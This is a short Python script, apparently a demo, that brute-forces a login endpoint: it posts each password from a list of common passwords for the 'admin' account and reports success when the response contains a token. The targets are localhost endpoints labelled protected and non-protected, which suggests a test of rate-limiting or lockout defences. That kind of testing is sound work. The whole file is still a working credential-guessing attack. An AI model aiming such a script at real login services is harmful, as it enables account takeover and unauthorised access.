import requests

def brute_force_login(url, login, password_list):
    for password in password_list:
        response = requests.post(
            url,
            json={"login": login, "password": password}
        )
        
        if response.status_code == 200 and "token" in response.json():
            print(f"[+] Found valid credentials: {login}:{password}")
            return password
        else:
            print(f"[-] Invalid: {login}:{password}")

    print("[-] No valid password found.")
    return None


# Przykład użycia
if __name__ == "__main__":
    target_url = "http://localhost:8000/login-check-non-protected"
    target_url2 = "http://localhost:8000/login-check-protected"
    username = "admin"
    passwords = [
        "123456", "admin", "password", "secret", "admin123", "secret123"  # itd.
    ]

    brute_force_login(target_url, username, passwords)
    brute_force_login(target_url2, username, passwords)
